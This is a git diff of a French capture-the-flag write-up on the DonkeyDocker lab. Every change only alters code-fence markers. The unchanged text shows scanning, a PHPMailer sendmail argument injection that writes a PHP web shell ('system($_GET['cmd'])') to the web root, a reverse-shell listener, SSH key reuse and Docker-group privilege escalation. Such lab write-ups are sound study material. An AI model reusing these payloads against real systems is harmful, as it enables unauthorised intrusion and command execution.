@@ -14,7 +14,7 @@ Bref ici [on va tutoyer les anges !](https://www.youtube.com/watch?v=MQuDX1Pb7A0
 You got mail
 ------------
 
-```plain
+```
 $ sudo nmap -T5 -sCV -p- 192.168.101.132 
 [sudo] Mot de passe de root  :   
 Starting Nmap 7.92 ( https://nmap.org )
@@ -43,7 +43,7 @@ A l'opposé, si on demande un nom de dossier qui existe vraiment, on obtiendra u
 
 On trouve de cette façon les dossiers *dist* et *mailer*. Le premier est vide quand au second on y trouve différents dossiers et fichiers :  
 
-```plain
+```
 $ feroxbuster -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -u http://192.168.101.132/mailer/ -n -s 200,403 -f
 --- snip ---
 403             11l             32w           302c http://192.168.101.132/mailer/docs/ 
@@ -88,7 +88,7 @@ On peut activer l'option *HttpTrace* ou mettre en écoute l'interface réseau po
 
 Pendant ce temps *Metasploit* envoie des requêtes régulières pour demander le fichier PHP qui devrait être déposé sur le serveur. C'est ce script qui contient le payload qui nous donnera par exemple le reverse shell demandé. Ainsi après un moment :  
 
-```plain
+```
 $ ncat -l -p 4444 -v
 Ncat: Version 7.92 ( https://nmap.org/ncat ) 
 Ncat: Listening on :::4444 
@@ -147,13 +147,13 @@ On sait que ça fonctionne quand la requête met trois plombes à s'exécuter :D
 
 Le premier signe de l'exploitation côté serveur c'est l'apparition du process sendmail :  
 
-```plain
+```
 2022/01/13 07:20:24 CMD: UID=33     PID=12964   | sh -c /usr/sbin/sendmail -t -i   -f"attacker\\" -oQ/tmp/ -X/www/phpcode.php   some\"@email.com
 ```
 
 Aussitôt le fichier est créé mais il est vide :  
 
-```plain
+```
 -rw-r--r--       ? 33             33                           0 Jan 13 08:22 /www/phpcode.php
 ```
 
@@ -161,13 +161,13 @@ Notez aussi le timestamp sur le fichier : pour une raison que j'ignore il est un
 
 Plus tard le fichier a gagné du contenu :  
 
-```plain
+```
 -rw-r--r--       ? 33             33                       609 Jan 13 08:25 /www/phpcode.php
 ```
 
 A ce stade c'est déjà gagné :  
 
-```plain
+```
 12964 >>> some"@email.com... Unbalanced '"' 
 12964 <<< To: Donkey <admin@dockerdonkey.com> 
 12964 <<< Subject: Message from zz<?php system($_GET['cmd']); ?>zz_name 
@@ -183,11 +183,11 @@ A ce stade c'est déjà gagné :
 
 Si on attend encore le message fait aussi son apparition :  
 
-```plain
+```
 -rw-r--r--       ? 33             33                     1675 Jan 13 08:27 /www/phpcode.php
 ```
 
-```plain
+```
 12964 <<< zz<?php system($_GET['cmd']); ?>zz_message 
 12964 <<<   
 12964 <<< [EOF] 
@@ -216,7 +216,7 @@ Si on attend encore le message fait aussi son apparition :
 
 Et après un moment on a la fin :  
 
-```plain
+```
 12964 >>> From: Docker Donkey Server <"attacker\" -oQ/tmp/ -X/www/phpcode.php   some"@email.com> 
 12964 >>> Message-ID: <0acccfff72a67c6805d080b6d6f5ab8f@192.168.101.132> 
 12964 >>> X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer) 
@@ -235,20 +235,20 @@ Bref le champ *name* (qui apparaît plus tôt) est plus intéressant que le cham
 
 L'exploitation laisse des traces, on a ainsi deux fichier créés dans */tmp* :  
 
-```plain
+```
 -rw-rw----       1 www-data www-data             44 Jan 13 07:27 df20D7P4U8012964
 -rw-rw----       1 www-data www-data         1015 Jan 13 07:29 qf20D7P4U8012964
 ```
 
 Le premier ne contient que le message :   
 
-```plain
+```
 zz<?php system($_GET['cmd']); ?>zz_message
 ```
 
 Le second ressemble à un mix d'entêtes et de charabia :  
 
-```plain
+```
 V8 
 T1642058704 
 K1642058944 
@@ -307,7 +307,7 @@ On remarque ainsi que l'utilisateur *smith* cache un flag.
 
 Comme rien ne semble prometteur malgré l'excellent LinPEAS je tente de me connecter avec *smith* / *smith* et ça fonctionne !  
 
-```plain
+```
 smith@12081bd067cc:~$ cat flag.txt   
 This is not the end, sorry dude. Look deeper! 
 I know nobody created a user into a docker 
@@ -321,14 +321,14 @@ PS: I like 1984 written by George ORWELL
 
 Certes, très bon livre si vous avez les tripes solides. L'indice est plus parlant quand on regarde du côté de SSH :  
 
-```plain
+```
 smith@12081bd067cc:~/.ssh$ cat authorized_keys   
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
 ```
 
 Comme la clé privée de *smith* est présente je tente de l'utiliser avec le compte *orwell* sur le serveur SSH vu au début.  
 
-```plain
+```
 $ ssh   -i smith.key orwell@192.168.101.132 
 Welcome to 
 
@@ -372,7 +372,7 @@ Boys on the docks
 
 L'utilisateur fait partie du groupe Docker. Est-ce que j'ai besoin d'en dire d'avantage ?   
 
-```plain
+```
 donkeydocker:~$ docker images 
 REPOSITORY                   TAG                                 IMAGE ID                       CREATED                         SIZE 
 donkeydocker               latest                           ae644a321321               4 years ago                 276 MB 
@@ -395,7 +395,7 @@ Sous le capot
 
 Et pour terminer l'article voici le Dockerfile du CTF :  
 
-```plain
+```
 FROM debian:jessie 
 
 # this Dockerfile based on: https://github.com/opsxcq/exploit-CVE-2016-10033 
